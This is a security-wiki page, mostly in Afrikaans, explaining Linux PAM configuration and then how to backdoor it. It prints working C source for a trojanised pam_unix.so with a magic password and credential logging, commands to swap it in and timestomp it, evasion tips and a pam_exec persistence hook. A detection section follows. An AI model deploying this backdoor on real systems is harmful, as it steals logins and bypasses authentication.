# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Basiese Inligting

**PAM (Pluggable Authentication Modules)** funksioneer as 'n sekuriteitsmeganisme wat **die identiteit verifieer van gebruikers wat probeer toegang kry tot rekenaardiens**, en beheer hul toegang op grond van verskeie kriteria. Dit is soos 'n digitale poortwagter wat verseker dat slegs gemagtigde gebruikers met spesifieke dienste kan skakel, terwyl dit moontlik hul gebruik beperk om stelseloorlading te voorkom.

#### Konfigurasielêers

- **Solaris- en UNIX-gebaseerde stelsels** gebruik tipies 'n sentrale konfigurasielêer wat by `/etc/pam.conf` geleë is.
- **Linux systems** verkies 'n gidsbenadering en stoor diens-spesifieke konfigurasies binne `/etc/pam.d`. Byvoorbeeld, die konfigurasielêer vir die login-diens is te vinde by `/etc/pam.d/login`.

'n Voorbeeld van 'n PAM-konfigurasie vir die login-diens kan soos volg lyk:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Bestuursdomeine**

Hierdie domeine, of bestuursgroepe, sluit in **auth**, **account**, **password**, en **session**, elk verantwoordelik vir verskillende aspekte van die verifikasie- en sessiebestuurproses:

- **Auth**: Valideer die gebruiker se identiteit, gewoonlik deur vir 'n wagwoord te vra.
- **Account**: Hanteer rekeningverifikasie, byvoorbeeld die kontrole van groepslidmaatskap of tydsbeperkings.
- **Password**: Beheer wagwoordopdaterings, insluitend kompleksiteitskontroles of die voorkoming van woordeboekaanvalle.
- **Session**: Bestuur aksies by die begin of einde van 'n diensessie, soos die montering van gidse of die instel van hulpbrongrensies.

#### **PAM Modulekontroles**

Kontroles bepaal hoe die module op sukses of mislukking reageer en beïnvloed die algehele verifikasieproses. Dit sluit in:

- **Required**: Die mislukking van 'n module wat as required gemerk is, lei uiteindelik tot mislukking, maar eers nadat alle daaropvolgende modules nagegaan is.
- **Requisite**: Onmiddellike beëindiging van die proses by mislukking.
- **Sufficient**: Sukses omseil die res van dieselfde domein se kontroles tensy 'n daaropvolgende module misluk.
- **Optional**: Veroorsaak slegs mislukking as dit die enigste module in die stapel is.

#### Voorbeeldscenario

In 'n opstelling met verskeie auth-modules volg die proses 'n streng volgorde. As die `pam_securetty`-module die aanmeldterminal as ongemagtig beskou, word root-aanmeldings geblokkeer, maar alle modules word steeds verwerk weens sy "required"-status. Die `pam_env` stel omgewingveranderlikes, wat moontlik die gebruikerservaring verbeter. Die `pam_ldap` en `pam_unix` modules werk saam om die gebruiker te verifieer, waar `pam_unix` probeer om 'n vroeër verskafte wagwoord te gebruik, wat doeltreffendheid en buigsaamheid in verifikasiemetodes verbeter.


## Backdooring PAM – Hooking `pam_unix.so`

A classic persistence trick in high-value Linux environments is to **swap the legitimate PAM library with a trojanised drop-in**. Because every SSH / console login ends up calling `pam_unix.so:pam_sm_authenticate()`, a few lines of C are enough to capture credentials or implement a *magic* password bypass.

### Kompilering Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compile en stealth-replace:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Wenke
1. **Atomic overwrite** – skryf na 'n tydelike lêer en `mv` in plek om half-geskrewe biblioteke te vermy wat SSH sou blokkeer.
2. Plaas van loglêers soos `/usr/bin/.dbus.log` meng met legitieme desktop-artefakte.
3. Hou simbool-eksporte identies (`pam_sm_setcred`, ens.) om PAM-wanfunksionering te vermy.

### Opsporing
* Vergelyk MD5/SHA256 van `pam_unix.so` met die distro-pakket.
* `rpm -V pam` of `debsums -s libpam-modules` om vervangde biblioteke te vind sonder manuele hashing.
* Kyk vir world-writable of ongewone eienaarskap onder `/lib/security/`.
* auditd-reël: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Grep PAM-konfigurasies vir onverwagte modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Vinnige triage-kommando's (post-compromise of bedreigingsjag)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Misbruik van `pam_exec` vir persistence
In plaas daarvan om `pam_unix.so` te vervang, is dit 'n ligter benadering om 'n `pam_exec`-reël in `/etc/pam.d/sshd` by te voeg, sodat elke SSH-aanmelding 'n implant lanseer terwyl die normale stack onaangeraak bly:
```bash
# Prepend to /etc/pam.d/sshd
session optional pam_exec.so quiet /usr/local/bin/.ssh_hook.sh
```
`pam_exec` word as root uitgevoer binne die sshd PAM-konteks, sodat die skrip reverse shells kan loslaat, env vars kan versamel, of geïmplanteerde sockets weer kan heropen sonder enige lêerstelsel-wysigings aan kernbiblioteke.


## Verwysings

- [https://hotpotato.tistory.com/434](https://hotpotato.tistory.com/434)
- [Palo Alto Unit42 – Infiltration of Global Telecom Networks](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)

{{#include ../../banners/hacktricks-training.md}}
